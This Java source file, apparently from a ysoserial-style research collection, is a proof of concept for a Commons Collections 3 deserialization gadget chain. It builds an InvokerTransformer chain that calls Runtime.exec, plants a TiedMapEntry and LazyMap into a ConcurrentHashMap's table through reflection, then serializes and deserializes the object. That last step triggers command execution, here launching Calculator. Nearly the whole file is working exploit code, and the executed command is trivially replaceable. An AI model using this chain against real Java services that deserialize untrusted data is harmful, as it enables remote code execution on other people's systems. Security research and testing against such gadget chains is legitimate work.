package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * <java.util.concurrent.ConcurrentHashMap: void readObject(java.io.ObjectInputStream)>
 * -><org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
 * -><org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
 * -><org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
 *     ...
 */

public class CC3_Poc7 {
    public static void main(String[] args) throws Exception {


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Object  tiedMapEntry = new TiedMapEntry(outerMap, new Class[0]);

        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        concurrentHashMap.put(1111,1);

        Field tableField = concurrentHashMap.getClass().getDeclaredField("table");
        Permit.setAccessible(tableField);
        Object[] table = (Object[]) tableField.get(concurrentHashMap);
        for (int i=0;i < table.length;i++){
            Object entry1 = table[i];
            if(entry1 != null) {
                Field keyField = entry1.getClass().getDeclaredField("key");
                Permit.setAccessible(keyField);
                keyField.set(entry1, tiedMapEntry);
            }
        }

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(concurrentHashMap);
        outputStream.close();


        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();
    }
}
